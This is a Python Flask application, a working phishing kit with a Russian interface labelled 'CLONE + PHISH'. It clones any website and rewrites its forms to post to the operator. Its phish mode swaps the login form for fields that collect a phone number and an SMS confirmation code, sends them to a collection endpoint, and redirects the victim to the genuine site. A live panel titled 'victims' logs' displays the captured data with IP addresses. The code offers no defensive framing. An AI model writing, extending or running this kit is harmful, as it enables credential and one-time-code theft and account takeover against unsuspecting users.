from flask import Flask, request, send_file, jsonify
import requests
from bs4 import BeautifulSoup
import os
import shutil
from urllib.parse import urljoin, urlparse
import zipfile
import time
import re
import hashlib
import json

app = Flask(__name__)
PROJECTS = {}

@app.route('/')
def home():
    return r'''<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Site Cloner</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#e0e0e0;font-family:Arial;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.box{max-width:500px;width:100%}
h1{text-align:center;font-size:28px;margin-bottom:20px;color:#667eea}
.card{background:#111122;border-radius:16px;padding:25px;border:1px solid #222;margin-bottom:15px}
label{display:block;margin-bottom:8px;color:#aaa;font-size:14px}
input,select{width:100%;padding:14px;border:1px solid #333;border-radius:12px;background:#0a0a14;color:#fff;font-size:16px;margin-bottom:15px}
input:focus,select:focus{outline:none;border-color:#667eea}
button{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;color:#fff}
button:hover{opacity:0.85}
.btn-clone{background:#667eea;margin-bottom:10px}
.btn-phish{background:#f5576c}
.result{margin-top:20px;padding:20px;border-radius:12px;display:none;word-break:break-all}
.result.show{display:block}
.result.success{background:#0a2a0a;border:1px solid #0f0}
.result.error{background:#2a0a0a;border:1px solid #f00}
.result a{color:#667eea;display:block;margin:5px 0}
.loading{display:none;text-align:center;padding:15px;color:#888}
.spinner{width:30px;height:30px;border:3px solid #333;border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
<h1>CLONE + PHISH</h1>
<div class="card">
<label>Ссылка на сайт</label>
<input type="text" id="url" placeholder="https://example.com/login">
<button class="btn-clone" onclick="doClone()">СКОПИРОВАТЬ САЙТ</button>
<button class="btn-phish" onclick="doPhish()">СДЕЛАТЬ ФИШИНГ</button>
</div>
<div class="loading" id="load"><div class="spinner"></div>Работаю...</div>
<div class="result" id="res"></div>
</div>
<script>
async function doClone(){await run('/api/clone')}
async function doPhish(){await run('/api/phish')}
async function run(url){
var u=document.getElementById('url').value.trim();
if(!u)return;
document.getElementById('load').style.display='block';
document.getElementById('res').classList.remove('show');
try{
var r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:u})});
var d=await r.json();
if(d.error){document.getElementById('res').innerHTML='<b>Ошибка:</b> '+d.error;document.getElementById('res').classList.add('show','error')}
else{
document.getElementById('res').innerHTML='<b>ГОТОВО!</b><br><br><b>Клон:</b> <a href="'+d.url+'" target="_blank">'+d.url+'</a><br><b>Скачать:</b> <a href="'+d.download+'">ZIP</a><br><b>Логи:</b> <a href="'+d.panel+'" target="_blank">Панель</a><br><small>Файлов: '+d.assets+' | Форм: '+d.forms+'</small>';
document.getElementById('res').classList.add('show','success')
}
}catch(e){document.getElementById('res').innerHTML='<b>Ошибка:</b> '+e.message;document.getElementById('res').classList.add('show','error')}
document.getElementById('load').style.display='none'
}
</script>
</body>
</html>'''

# ========== ЗАГРУЗКА РЕСУРСОВ ==========
def download_assets(sess, soup, base_url, out_dir):
    assets = 0
    # CSS
    for tag in soup.find_all('link', href=True):
        href = urljoin(base_url, tag['href'].strip())
        try:
            name = os.path.basename(urlparse(href).path.split('?')[0])
            if not name or '.' not in name: name = 'style.css'
            r = sess.get(href, timeout=10)
            if r.status_code == 200 and len(r.content) > 100:
                with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
                tag['href'] = 'assets/' + name
                assets += 1
        except: pass
    
    # JS
    for tag in soup.find_all('script', src=True):
        src = urljoin(base_url, tag['src'].strip())
        try:
            name = os.path.basename(urlparse(src).path.split('?')[0])
            if not name or '.' not in name: name = 'script.js'
            r = sess.get(src, timeout=10)
            if r.status_code == 200 and len(r.content) > 100:
                with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
                tag['src'] = 'assets/' + name
                assets += 1
        except: pass
    
    # IMG
    for tag in soup.find_all('img', src=True):
        src = tag['src'].strip()
        if not src or src.startswith('data:'): continue
        src = urljoin(base_url, src)
        try:
            ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
            name = 'img_' + str(abs(hash(src)))[:8] + ext
            r = sess.get(src, timeout=10)
            if r.status_code == 200 and len(r.content) > 100:
                with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
                tag['src'] = 'assets/' + name
                assets += 1
        except: pass
    
    # BACKGROUND IMAGES
    for tag in soup.find_all(style=True):
        urls = re.findall(r'url\(["\']?([^"\'()]+)["\']?\)', str(tag['style']))
        for u in urls:
            src = urljoin(base_url, u)
            try:
                ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
                name = 'bg_' + str(abs(hash(src)))[:8] + ext
                r = sess.get(src, timeout=10)
                if r.status_code == 200 and len(r.content) > 100:
                    with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
                    tag['style'] = tag['style'].replace(u, 'assets/' + name)
                    assets += 1
            except: pass
    
    return assets

# ========== API CLONE ==========
@app.route('/api/clone', methods=['POST'])
def api_clone():
    url = (request.get_json(silent=True) or {}).get('url', '').strip()
    if not url: return jsonify({'error': 'Введите URL'}), 400
    if not url.startswith('http'): url = 'https://' + url
    
    pid = 'c' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
    out = '/tmp/' + pid
    os.makedirs(out + '/assets', exist_ok=True)
    
    sess = requests.Session()
    sess.headers.update({
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        'Accept': 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'ru-RU,ru;q=0.9'
    })
    
    try:
        r = sess.get(url, allow_redirects=True, timeout=20)
        if r.status_code != 200: return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
        
        soup = BeautifulSoup(r.text, 'html.parser')
        final_url = r.url
        domain = urlparse(final_url).netloc
        assets = download_assets(sess, soup, final_url, out)
        forms = 0
        
        # Меняем формы
        for form in soup.find_all('form'):
            form['action'] = '/submit/' + pid
            form['method'] = 'POST'
            # Убираем оригинальные обработчики
            for attr in ['onsubmit', 'onclick']:
                if form.get(attr): del form[attr]
            forms += 1
        
        # Сохраняем HTML
        html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n'
        html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
        html += '<base href="/p/' + pid + '/">\n'
        # Копируем ВСЕ теги из head
        head = soup.find('head')
        if head:
            for tag in head.find_all(True):
                if tag.name not in ['script', 'link', 'meta', 'title', 'style']: continue
                html += str(tag) + '\n'
        html += '</head>\n'
        
        body = soup.find('body')
        if body:
            # Убираем скрипты которые могут мешать
            for script in body.find_all('script'):
                if script.get('src') and any(x in script['src'] for x in ['analytics', 'gtag', 'metric']):
                    script.decompose()
            html += str(body)
        else:
            html += str(soup)
        html += '\n</html>'
        
        with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html)
        
        PROJECTS[pid] = {'url': url, 'domain': domain, 'dir': out, 'assets': assets, 'forms': forms, 'logs': [], 'type': 'clone'}
        
        host = request.host_url.rstrip('/')
        return jsonify({
            'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
            'panel': host + '/panel/' + pid, 'assets': assets, 'forms': forms
        })
    except Exception as e:
        return jsonify({'error': str(e)[:200]}), 500

# ========== API PHISH ==========
@app.route('/api/phish', methods=['POST'])
def api_phish():
    url = (request.get_json(silent=True) or {}).get('url', '').strip()
    if not url: return jsonify({'error': 'Введите URL'}), 400
    if not url.startswith('http'): url = 'https://' + url
    
    pid = 'p' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
    out = '/tmp/' + pid
    os.makedirs(out + '/assets', exist_ok=True)
    
    sess = requests.Session()
    sess.headers.update({
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        'Accept': 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'ru-RU,ru;q=0.9'
    })
    
    try:
        r = sess.get(url, allow_redirects=True, timeout=20)
        if r.status_code != 200: return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
        
        soup = BeautifulSoup(r.text, 'html.parser')
        final_url = r.url
        domain = urlparse(final_url).netloc
        assets = download_assets(sess, soup, final_url, out)
        forms = 0
        
        # Находим главную форму
        main_form = soup.find('form')
        
        if main_form:
            # Очищаем форму
            main_form.clear()
            main_form['action'] = '/submit/' + pid
            main_form['method'] = 'POST'
            main_form['id'] = 'phishForm'
            
            # Создаём поля
            phone_div = soup.new_tag('div')
            phone_div['class'] = main_form.get('class', '')
            
            phone_label = soup.new_tag('label')
            phone_label.string = 'Номер телефона'
            phone_div.append(phone_label)
            
            phone_input = soup.new_tag('input')
            phone_input['type'] = 'tel'
            phone_input['name'] = 'phone'
            phone_input['placeholder'] = '+7 (999) 123-45-67'
            phone_input['required'] = ''
            phone_input['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
            phone_div.append(phone_input)
            
            # Код
            code_div = soup.new_tag('div')
            code_div['id'] = 'codeDiv'
            code_div['style'] = 'display:none'
            
            code_label = soup.new_tag('label')
            code_label.string = 'Код из SMS'
            code_div.append(code_label)
            
            code_input = soup.new_tag('input')
            code_input['type'] = 'text'
            code_input['name'] = 'code'
            code_input['placeholder'] = 'Введите код'
            code_input['maxlength'] = '6'
            code_input['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
            code_div.append(code_input)
            
            # Кнопка
            btn = soup.new_tag('button')
            btn['type'] = 'submit'
            btn['id'] = 'phishBtn'
            btn['style'] = 'width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer'
            btn.string = 'Продолжить'
            
            # Собираем
            main_form.append(phone_div)
            main_form.append(code_div)
            main_form.append(btn)
            
            # Добавляем скрипт перехвата
            script = soup.new_tag('script')
            script.string = '''
var step=1;
var phishId=''' + pid + '''';
var redirectUrl=''' + json.dumps(final_url) + ''';
document.getElementById('phishForm').addEventListener('submit',function(e){
    e.preventDefault();
    var phone=this.querySelector('[name="phone"]').value.replace(/[^0-9]/g,'');
    if(step===1){
        if(phone.length<10){alert('Введите полный номер');return;}
        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&step=1'});
        document.getElementById('codeDiv').style.display='block';
        document.getElementById('phishBtn').textContent='Подтвердить';
        this.querySelector('[name="code"]').focus();
        step=2;
    }else{
        var code=this.querySelector('[name="code"]').value.trim();
        if(code.length<4){alert('Введите код');return;}
        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&code='+code+'&step=2'});
        document.getElementById('phishBtn').textContent='Проверка...';
        document.getElementById('phishBtn').disabled=true;
        setTimeout(function(){window.location.href=redirectUrl},3000);
    }
});
'''
            soup.find('body').append(script) if soup.find('body') else soup.append(script)
            forms = 1
        else:
            # Если нет формы - создаём
            wrapper = soup.new_tag('div')
            wrapper['style'] = 'max-width:350px;margin:50px auto;padding:30px;background:#fff;border-radius:16px;box-shadow:0 2px 20px rgba(0,0,0,0.1);text-align:center;font-family:Arial'
            
            wrapper.append(BeautifulSoup('<h2 style="margin-bottom:10px">Вход</h2><p style="color:#666;margin-bottom:20px">Введите номер телефона</p>', 'html.parser'))
            
            form = soup.new_tag('form')
            form['action'] = '/submit/' + pid
            form['method'] = 'POST'
            form['id'] = 'phishForm'
            form['style'] = 'text-align:left'
            
            form.append(BeautifulSoup('<label style="display:block;font-size:14px;color:#888;margin-bottom:5px">Номер телефона</label><input type="tel" name="phone" placeholder="+7 (999) 123-45-67" required style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"><div id="codeDiv" style="display:none"><label style="display:block;font-size:14px;color:#888;margin-bottom:5px">Код из SMS</label><input type="text" name="code" placeholder="Введите код" maxlength="6" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"></div><button type="submit" id="phishBtn" style="width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer">Продолжить</button>', 'html.parser'))
            
            wrapper.append(form)
            
            script = soup.new_tag('script')
            script.string = '''
var step=1;
var phishId=''' + pid + '''';
var redirectUrl=''' + json.dumps(final_url) + ''';
document.getElementById('phishForm').addEventListener('submit',function(e){
    e.preventDefault();
    var phone=this.querySelector('[name="phone"]').value.replace(/[^0-9]/g,'');
    if(step===1){
        if(phone.length<10){alert('Введите полный номер');return;}
        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&step=1'});
        document.getElementById('codeDiv').style.display='block';
        document.getElementById('phishBtn').textContent='Подтвердить';
        this.querySelector('[name="code"]').focus();
        step=2;
    }else{
        var code=this.querySelector('[name="code"]').value.trim();
        if(code.length<4){alert('Введите код');return;}
        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&code='+code+'&step=2'});
        document.getElementById('phishBtn').textContent='Проверка...';
        document.getElementById('phishBtn').disabled=true;
        setTimeout(function(){window.location.href=redirectUrl},3000);
    }
});
'''
            wrapper.append(script)
            
            if soup.find('body'):
                soup.find('body').clear()
                soup.find('body').append(wrapper)
            else:
                soup.clear()
                soup.append(wrapper)
            forms = 1
        
        # Сохраняем
        html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n'
        html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
        html += '<base href="/p/' + pid + '/">\n'
        head = soup.find('head')
        if head:
            for tag in head.find_all(True):
                if tag.name in ['meta', 'title', 'link', 'style']:
                    html += str(tag) + '\n'
        html += '</head>\n' + (str(soup.find('body')) if soup.find('body') else str(soup)) + '\n</html>'
        
        with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html)
        
        PROJECTS[pid] = {'url': url, 'domain': domain, 'dir': out, 'assets': assets, 'forms': forms, 'logs': [], 'type': 'phish'}
        
        host = request.host_url.rstrip('/')
        return jsonify({
            'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
            'panel': host + '/panel/' + pid, 'assets': assets, 'forms': forms
        })
    except Exception as e:
        return jsonify({'error': str(e)[:200]}), 500

# ========== SERVE ==========
@app.route('/p/<pid>')
def serve_page(pid):
    path = '/tmp/' + pid + '/index.html'
    if os.path.exists(path): return open(path, encoding='utf-8').read()
    return 'Not found', 404

@app.route('/p/<pid>/<path:filename>')
def serve_assets(pid, filename):
    path = '/tmp/' + pid + '/' + filename
    if os.path.exists(path):
        ct = 'text/css' if filename.endswith('.css') else 'application/javascript' if filename.endswith('.js') else 'image/png' if filename.endswith('.png') else 'image/jpeg'
        return open(path, 'rb').read(), 200, {'Content-Type': ct}
    return 'Not found', 404

# ========== SUBMIT ==========
@app.route('/submit/<pid>', methods=['POST'])
def submit_data(pid):
    data = dict(request.form)
    data['ip'] = request.remote_addr
    data['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
    if pid in PROJECTS: PROJECTS[pid].setdefault('logs', []).append(data)
    with open('/tmp/' + pid + '/logs.json', 'a') as f: f.write(json.dumps(data) + '\n')
    return jsonify({'status': 'ok'})

# ========== LOGS PANEL ==========
@app.route('/panel/<pid>')
def panel(pid):
    logs = PROJECTS.get(pid, {}).get('logs', [])
    log_html = ''
    for l in logs[-30:]:
        log_html += '<div style="background:#111;padding:10px;margin:5px 0;border-radius:8px;font-size:13px;font-family:monospace">'
        for k, v in l.items():
            log_html += '<span style="color:#ff0">' + k + ':</span> <span style="color:#0ff">' + str(v) + '</span><br>'
        log_html += '</div>'
    
    return '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Логи</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>*{margin:0;padding:0}body{background:#0a0a0f;color:#0f0;font-family:monospace;padding:20px}h1{font-size:18px;margin-bottom:10px}.count{color:#f00;font-size:28px;margin-bottom:15px}.empty{color:#666;text-align:center;margin-top:50px}</style>
<script>setInterval(function(){location.reload()},5000)</script></head>
<body><h1>ЛОГИ ЖЕРТВ</h1><div class="count">Всего: ''' + str(len(logs)) + '''</div>''' + (log_html or '<div class="empty">Ожидание...</div>') + '''</body></html>'''

# ========== DOWNLOAD ==========
@app.route('/api/download/<pid>')
def api_download(pid):
    if pid not in PROJECTS: return 'Not found', 404
    zip_path = '/tmp/' + pid + '.zip'
    shutil.make_archive('/tmp/' + pid, 'zip', PROJECTS[pid]['dir'])
    return send_file(zip_path, as_attachment=True, download_name=pid + '.zip')

# ========== START ==========
if __name__ == '__main__':
    os.makedirs('/tmp', exist_ok=True)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
